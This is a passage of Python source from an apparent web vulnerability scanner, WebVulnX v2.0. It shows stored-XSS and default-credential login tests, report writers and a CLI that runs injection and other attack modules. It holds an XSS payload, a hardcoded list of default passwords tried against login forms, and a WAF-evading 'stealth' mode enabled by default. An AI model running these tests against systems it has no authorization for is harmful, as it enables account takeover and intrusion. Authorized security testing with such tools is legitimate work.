                            evidence=f"JWT with {', '.join(issues)}",
                            detail="Weak JWT configuration allows token forgery.",
                            cvss_hint=8.0,
                        ))

    # -- Stored XSS ----------------------------------------------------------
    STORED_MARKER = "drkstr3d7x"
    STORED_PAYLOAD = f"<img src=x onerror=alert(1)>"

    def scan_stored_xss(self) -> None:
        info("Stored XSS tests (form submissions)")
        for form in self.state.forms[:10]:
            names = [i["name"] for i in form["inputs"] if i["name"]
                     and i["type"] not in ("submit", "button", "image", "file", "reset")]
            if not names:
                continue
            data = {n: (self.STORED_PAYLOAD + self.STORED_MARKER if i == 0 else "x")
                    for i, n in enumerate(names)}
            if form.get("method", "get").lower() == "get":
                self.client.get(self._clean(form.get("url", "")), params=data)
            else:
                self.client.request("POST", form.get("url", ""), data=data)
            # Re-visit the page and check if the payload persisted verbatim
            for revisit in (form.get("url", ""), self.state.base_url):
                r = self.client.get(self._clean(revisit))
                if r is not None and self.STORED_MARKER in r.text and \
                        self.STORED_PAYLOAD in r.text:
                    self.state.add(Finding(
                        vuln_type="Stored XSS",
                        severity="Critical", url=revisit,
                        parameter=",".join(names[:3]),
                        payload=self.STORED_PAYLOAD,
                        evidence="payload persisted and rendered unescaped after submission",
                        detail="Input is stored and rendered without encoding — "
                               "every visitor executes the payload.",
                        cvss_hint=8.6,
                    ))
                    return

    # -- Default credentials (opt-in) ---------------------------------------
    DEFAULT_CREDS = [("admin", "admin"), ("admin", "password"), ("admin", "123456"),
                     ("admin", "admin123"), ("test", "test"), ("guest", "guest"),
                     ("user", "user"), ("administrator", "administrator")]

    def scan_default_creds(self) -> None:
        info("Default credential tests (login forms)")
        for form in self.state.forms:
            names = [i["name"] for i in form["inputs"] if i["name"]
                     and i["type"] not in ("submit", "button", "image", "file", "reset")]
            user_field = next((n for n in names if re.search(r"user|login|email", n, re.I)), None)
            pass_field = next((n for n in names if re.search(r"pass|pwd", n, re.I)), None)
            if not user_field or not pass_field:
                continue
            base = self.client.request(form["method"].upper(), form["url"],
                                       data={n: "" for n in names}) \
                   if form["method"] != "get" else None
            for u, p in self.DEFAULT_CREDS:
                data = {n: "x" for n in names}
                data[user_field], data[pass_field] = u, p
                if form["method"] == "get":
                    resp = self.client.get(self._clean(form["url"]), params=data)
                else:
                    resp = self.client.request("POST", form["url"], data=data)
                if resp is None:
                    continue
                body = resp.text.lower()
                if any(k in body for k in ("logout", "log out", "sign out",
                                           "welcome", "dashboard", "profile")) \
                   and "invalid" not in body and "incorrect" not in body and \
                   "wrong" not in body and "error" not in body[:500]:
                    self.state.add(Finding(
                        vuln_type="Default / Weak Credentials",
                        severity="High", url=form["url"],
                        parameter=f"{user_field}:{u} / {pass_field}:{p}",
                        evidence="login appears to succeed with default credentials",
                        detail="Default credentials accepted — verify manually and "
                               "rotate immediately.",
                        cvss_hint=7.5,
                    ))
                    break


# ============================================================================
# Reporting
# ============================================================================
def write_json_report(state: ScanState, path: str,
                      client_stats: Optional[Dict[str, Any]] = None) -> None:
    cs = client_stats or {}
    cov = state.coverage()
    data = {
        "tool": "WebVulnX v2.0",
        "target": state.base_url,
        "scanned_at": datetime.now(timezone.utc).isoformat(),
        "duration_s": round(time.time() - state.start_ts, 2),
        "stats": {
            "urls_crawled": cov["urls_crawled"],
            "forms": cov["forms_found"],
            "parameters": cov["parameters"],
            "findings": len(state.findings),
            "actionable_findings": len([f for f in state.findings
                                        if f.severity != "Info"]),
            "requests_sent": cs.get("requests", 0),
            "connection_errors": cs.get("errors", 0),
            "blocked_responses": cs.get("blocked", 0),
            "waf_challenge_pages": cs.get("waf_hits", 0),
            "status_codes": cs.get("statuses", {}),
            "modules_run": cov["modules_run"],
            "seed_urls": cov["seed_urls"],
            "degraded": state.degraded,
        },
        "diagnostics": state.diagnostics,
        "findings": [asdict(f) for f in state.findings],
    }
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(data, fh, indent=2, ensure_ascii=False)
    ok(f"JSON report: {path}")


def write_html_report(state: ScanState, path: str,
                      client_stats: Optional[Dict[str, Any]] = None) -> None:
    """World-class executive HTML report (print-to-PDF ready)."""
    cs = client_stats or {}
    cov = state.coverage()
    payload = {
        "target": state.base_url,
        "stats": {
            "urls_crawled": cov["urls_crawled"],
            "forms": cov["forms_found"],
            "parameters": cov["parameters"],
            "findings": len(state.findings),
            "requests_sent": cs.get("requests", 0),
            "connection_errors": cs.get("errors", 0),
            "blocked_responses": cs.get("blocked", 0),
            "waf_challenge_pages": cs.get("waf_hits", 0),
            "modules_run": cov["modules_run"],
            "seed_urls": cov["seed_urls"],
            "degraded": state.degraded,
            "duration_s": round(time.time() - state.start_ts, 2),
        },
        "findings": [asdict(f) for f in state.findings],
        "diagnostics": state.diagnostics,
    }
    dreport.write_html_report(path, payload)
    ok(f"HTML report: {path}")


def load_wordlist(path: Optional[str]) -> List[str]:
    if path:
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                return [l.strip() for l in fh if l.strip() and not l.startswith("#")]
        except OSError:
            fail(f"Wordlist not found: {path} — using built-in list")
    return DEFAULT_DIRS


# ============================================================================
# CLI / orchestration
# ============================================================================
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="webvulnx",
        description="WebVulnX v2.0 - Advanced Web Application Vulnerability Scanner",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 webvulnx.py -u https://target.example --full\n"
            "  python3 webvulnx.py -u https://target.example/app --sqli --xss\n"
            "  python3 webvulnx.py -u https://target.example --dirs -w wordlists/dirs.txt\n"
            "  python3 webvulnx.py -u https://target.example --full --json reports/r.json\n\n"
            "LEGAL: Only test applications you are authorized to assess."
        ),
    )
    p.add_argument("-u", "--url", required=True, help="Target base URL")
    p.add_argument("--full", action="store_true", help="Enable all modules")
    p.add_argument("--crawl", action="store_true", help="Crawl only")
    p.add_argument("--sqli", action="store_true", help="SQL injection tests")
    p.add_argument("--xss", action="store_true", help="XSS tests")
    p.add_argument("--dirs", action="store_true", help="Directory brute-force")
    p.add_argument("--audit", action="store_true", help="Misconfiguration audit")
    p.add_argument("--advanced", action="store_true",
                   help="Advanced modules: LFI, SSTI, CMDi, open redirect, CORS, "
                        "CRLF, dir listing, JS libs, sensitive data")
    p.add_argument("--lfi", action="store_true", help="LFI / path traversal only")
    p.add_argument("--ssti", action="store_true", help="SSTI only")
    p.add_argument("--cmdi", action="store_true", help="Command injection only")
    p.add_argument("--no-param-fuzz", action="store_true",
                   help="Skip hidden-parameter discovery")
    p.add_argument("--default-creds", action="store_true",
                   help="Try default credentials on login forms (authorized tests only)")
    p.add_argument("-w", "--wordlist", help="Wordlist file for directory busting")
    p.add_argument("-d", "--depth", type=int, default=3, help="Crawl depth [3]")
    p.add_argument("--max-urls", type=int, default=150, help="Max crawled URLs [150]")
    p.add_argument("--timeout", type=float, default=10.0, help="HTTP timeout [10]")
    p.add_argument("--delay", type=float, default=0.0, help="Delay between requests [0]")
    p.add_argument("--stealth", dest="stealth", action="store_true", default=True,
                   help="Browser fingerprint + WAF backoff + human jitter (default ON)")
    p.add_argument("--no-stealth", dest="stealth", action="store_false",
                   help="Disable stealth (lab / authorized high-rate scans)")
    p.add_argument("--time-blind", type=float, default=5.0,
                   help="Seconds for time-based SQLi [5]")
    p.add_argument("--no-time-blind", action="store_true",
                   help="Skip time-based SQLi (much faster on slow/remote targets)")
    p.add_argument("--cookie", help='Cookies, e.g. "PHPSESSID=abc; role=user"')
    p.add_argument("--header", action="append", default=[],
                   help='Extra header "Name: Value" (repeatable)')
    p.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080")
    p.add_argument("--no-crawl", action="store_true", help="Skip crawling (test base URL only)")
    p.add_argument("--no-root-expansion", action="store_true",
                   help="Do NOT auto-add the site root / robots.txt / sitemap "
                        "when a sub-page URL is given (strict single-URL scope)")
    p.add_argument("--no-probe-paths", action="store_true",
                   help="Skip probing common entry points (/login, /admin, /search …)")
    # ---- deep XSS engine -------------------------------------------------
    p.add_argument("--xss-legacy", action="store_true",
                   help="Use the old simple XSS checks instead of the "
                        "context-aware deep engine")
    p.add_argument("--xss-payload-limit", type=int, default=14,
                   help="Curated payloads tried per reflection context [14]")
    p.add_argument("--xss-brute", action="store_true",
                   help="Also try the vendored PayloadsAllTheThings vectors "
                        "(1,622 community payloads, marker-verified)")
    p.add_argument("--xss-brute-limit", type=int, default=250,
                   help="How many community vectors to try per point [250]")
    p.add_argument("--no-xss-headers", action="store_true",
                   help="Skip XSS testing of HTTP headers (UA/Referer/XFF/Origin…)")
    p.add_argument("--no-xss-stored", action="store_true",
                   help="Skip the stored/blind XSS marker sweep")
    p.add_argument("--no-xss-dom", action="store_true",
                   help="Skip static DOM XSS source→sink analysis of site JS")
    p.add_argument("--json", metavar="FILE", help="JSON report path")
    p.add_argument("--html", metavar="FILE", help="HTML report path")
    return p


def main() -> None:
    args = build_parser().parse_args()
    print(colorize(BANNER, "cyan"))
    warn("Authorized testing only — you are responsible for legal compliance.")

    if not (args.full or args.crawl or args.sqli or args.xss or args.dirs
            or args.audit or args.advanced or args.lfi or args.ssti or args.cmdi):
        args.full = True

    # Headers / cookies
    extra_headers = {}
    for h in args.header:
        if ":" in h:
            k, _, v = h.partition(":")
            extra_headers[k.strip()] = v.strip()
    cookies = {}
    if args.cookie:
        for part in args.cookie.split(";"):
            if "=" in part:
                k, _, v = part.partition("=")
                cookies[k.strip()] = v.strip()

    client = HttpClient(timeout=args.timeout, delay=args.delay,
                        cookies=cookies, headers=extra_headers, proxy=args.proxy,
                        stealth=args.stealth, target=args.url)
    args.url = ensure_scheme(args.url)
    state = ScanState(base_url=args.url, start_ts=time.time())

    # Reachability check (with real diagnostics instead of a blind error)
    probe = client.get(args.url)
    if probe is None:
        fail(f"Cannot reach {args.url}")
        err = client.last_error or "unknown error"
        warn(f"Underlying error: {err}")
        warn(f"Hint: {diagnose_error(err)}")
        if not args.url.startswith("https://"):
            warn(f"Trying https:// fallback ...")
            probe = client.get(args.url.replace("http://", "https://"))
            if probe is not None:
                args.url = args.url.replace("http://", "https://")
                state.base_url = args.url
                warn("Note: only https:// works for this target — using it.")
    if probe is None:
        fail("Giving up. Common fixes: use a full URL (http://target.com), "
             "check connectivity (curl -I <url>), or raise --timeout.")
        sys.exit(1)
    ok(f"Target alive: {probe.status_code} | Server: {probe.headers.get('Server','?')}")

    # ---- module bookkeeping (so the report can PROVE what was tested) ------
    def run_module(name: str, fn, *a, **kw):
        client.module = name
        state.modules_run.append(name)
        info(f"── module: {name} ──")
        try:
            return fn(*a, **kw)
        except Exception as e:            # one broken module must not kill the scan
            warn(f"module {name} crashed: {type(e).__name__}: {e}")
            state.note(f"Module {name} failed: {type(e).__name__}: {e}")
            return None

    # ---- Scope expansion + crawl ------------------------------------------
    seeds: List[str] = [args.url]
    if not args.no_crawl:
        if not args.no_root_expansion:
            seeds = discover_seeds(client, args.url, state,
                                   expand_root=True,
                                   probe_paths=not args.no_probe_paths)
        Crawler(client, state, max_depth=args.depth,
                max_urls=args.max_urls).run(args.url, seeds=seeds)
        state.crawled_urls.add(args.url)
    else:
        state.crawled_urls.add(args.url)
        state.note("Crawling disabled (--no-crawl): only the given URL was tested")

    # Modules
    if not args.no_param_fuzz:
        run_module("param-discovery", ParamFuzzer(client, state).run)
    if args.full or args.audit:
        run_module("misconfig-audit", MisconfigAudit(client, state).run, args.url)
    if args.full or args.sqli:
        run_module("sqli", SqliScanner(
            client, state,
            time_delay=None if args.no_time_blind else args.time_blind).run)
    if args.full or args.xss:
        if args.xss_legacy:
            run_module("xss-legacy", XssScanner(client, state).run)
        else:
            deep = xd.DeepXssScanner(
                client, state, Finding,
                payload_limit=args.xss_payload_limit,
                brute=args.xss_brute,
                brute_limit=args.xss_brute_limit,
                test_headers=not args.no_xss_headers,
                stored_sweep=not args.no_xss_stored,
                dom_analysis=not args.no_xss_dom,
            )
            run_module("xss-deep", deep.run)
            state.xss_deep = deep.stats()
    if args.full or args.dirs:
        run_module("dirbuster", DirBuster(
            client, state, load_wordlist(args.wordlist)).run, args.url)
    adv = AdvancedScanner(client, state)
    if args.full or args.advanced or args.lfi:
        run_module("lfi", adv.scan_lfi)
    if args.full or args.advanced or args.ssti:
        run_module("ssti", adv.scan_ssti)
    if args.full or args.advanced or args.cmdi:
        run_module("cmdi", adv.scan_cmdi)
    if args.full or args.advanced:
        for nm, fn in (("open-redirect", adv.scan_open_redirect),
                       ("cors", adv.scan_cors),
                       ("crlf", adv.scan_crlf),
                       ("dir-listing", adv.scan_dir_listing),
                       ("js-libs", adv.scan_js_libs),
                       ("sensitive-data", adv.scan_sensitive),
                       ("known-cves", adv.scan_known_vulns),
                       ("csrf", adv.scan_csrf),
                       ("xxe", adv.scan_xxe),
                       ("ssrf", adv.scan_ssrf),
                       ("host-header", adv.scan_host_header),
                       ("jwt", adv.scan_jwt),
                       ("stored-xss", adv.scan_stored_xss)):
            run_module(nm, fn)
    if args.default_creds:
        run_module("default-creds", adv.scan_default_creds)
    if args.full or args.advanced or args.audit or args.dirs:
        run_module("world-surface", ws.WorldScanner(client, state, Finding).run)

    # ---- Coverage / why-nothing-found diagnosis ---------------------------
    st = client.stats
    total = max(st["requests"], 1)
    block_ratio = (st["blocked"] + st["errors"]) / total
    n_params = sum(len(v) for v in state.params.values())
    state.tests_run = st["requests"]

    print(colorize("\n────── Scan Coverage (proof of work) ──────", "bold"))
    print(f"  Seed URLs          : {len(state.seeds_used)}")
    print(f"  URLs crawled       : {len(state.crawled_urls)}")
    print(f"  Forms found        : {len(state.forms)}")
    print(f"  Parameters seen    : {n_params}")
    print(f"  Modules executed   : {len(state.modules_run)} "
          f"({', '.join(state.modules_run[:8])}{' …' if len(state.modules_run) > 8 else ''})")
    print(f"  HTTP requests sent : {st['requests']}")
    if state.xss_deep:
        d = state.xss_deep
        print(f"  Deep XSS engine    : {d.get('probes_sent', 0)} context probes, "
              f"{d.get('payloads_sent', 0)} payloads, "
              f"{d.get('markers_planted', 0)} stored markers planted")
        cs = d.get("contexts_seen") or {}
        if cs:
            print(f"  Reflection contexts: "
                  + ", ".join(f"{k}×{v}" for k, v in
                              sorted(cs.items(), key=lambda kv: -kv[1])[:8]))
        conf = d.get("confirmed_points") or []
        print(f"  Executable XSS at  : {len(conf)} injection point(s)"
              + (f" -> {'; '.join(conf[:3])}" if conf else ""))
    print(f"  Connection errors  : {st['errors']}")
    print(f"  Blocked (4xx/5xx)  : {st['blocked']}  | WAF/challenge pages: {st['waf_hits']}")
    top = sorted(st["statuses"].items(), key=lambda kv: -kv[1])[:6]
    print(f"  Status codes       : " + ", ".join(f"{k}×{v}" for k, v in top))

    if st["waf_hits"] or block_ratio > 0.35:
        state.degraded = True
        msg = (f"SCAN DEGRADED — {st['waf_hits']} WAF/challenge page(s) and "
               f"{round(block_ratio * 100)}% of requests were blocked or failed. "
               f"The target is filtering this scanner, so a clean result here is "
               f"NOT proof the site is secure.")
        warn(msg)
        state.note(msg)
        state.findings.append(Finding(
            vuln_type="Scan degraded — WAF / rate-limit blocking",
            severity="Info", url=args.url,
            evidence=f"{st['blocked']} blocked, {st['errors']} errors, "
                     f"{st['waf_hits']} WAF pages of {st['requests']} requests",
            detail="Re-run with --delay 0.5, a browser User-Agent (--header "
                   "'User-Agent: Mozilla/5.0 …'), authenticated cookies "
                   "(--cookie), or through an allowed source IP."))
    if len(state.crawled_urls) <= 2 and n_params == 0 and not state.forms:
        msg = ("NO ATTACK SURFACE FOUND — the crawler reached only "
               f"{len(state.crawled_urls)} URL(s) with 0 parameters and 0 forms, "
               "so injection modules had nothing to test. This usually means the "
               "site is a SPA/JS app, needs authentication, or blocked the crawl.")
        warn(msg)
        state.note(msg)
        state.findings.append(Finding(
            vuln_type="No attack surface discovered (nothing was testable)",
            severity="Info", url=args.url,
            evidence=f"urls={len(state.crawled_urls)} forms={len(state.forms)} "
                     f"params={n_params} requests={st['requests']}",
            detail="Try: scan the site ROOT url, raise --depth/--max-urls, pass "
                   "session cookies (--cookie), enable --dirs, or point the scan "
                   "at a URL that already has query parameters."))
    if n_params == 0 and state.forms and not state.degraded:
        state.note("Forms were found but no parameter names could be extracted "
                   "— injection modules tested the raw form actions only.")

    # Summary
    print(colorize("\n────── Findings Summary ──────", "bold"))
    counts: Dict[str, int] = {}
    for f in state.findings:
        counts[f.severity] = counts.get(f.severity, 0) + 1
    for sev in ("Critical", "High", "Medium", "Low", "Info"):
        if sev in counts:
            tag = {"Critical": "red", "High": "red", "Medium": "yellow",
                   "Low": "cyan", "Info": "blue"}[sev]
            print(f"  {colorize(sev, tag):<25} {counts[sev]}")
    real = [f for f in state.findings if f.severity != "Info"]
    ok(f"Total findings: {len(state.findings)} "
       f"({len(real)} actionable) | Duration: "
       f"{round(time.time() - state.start_ts, 2)}s")
    if not real and not state.degraded:
        print(colorize(
            "  No exploitable vulnerability was confirmed on the tested surface. "
            f"{st['requests']} requests across {len(state.modules_run)} modules "
            f"and {n_params} parameter(s) were actually sent and verified — "
            "this is a tested-clean result, not an empty scan.", "dim"))

    if state.diagnostics:
        print(colorize("\n────── Diagnostics ──────", "bold"))
        for d in state.diagnostics:
            print(f"  • {d}")

    if args.json:
        write_json_report(state, args.json, client_stats=st)
    if args.html:
        write_html_report(state, args.html, client_stats=st)


if __name__ == "__main__":
    main()
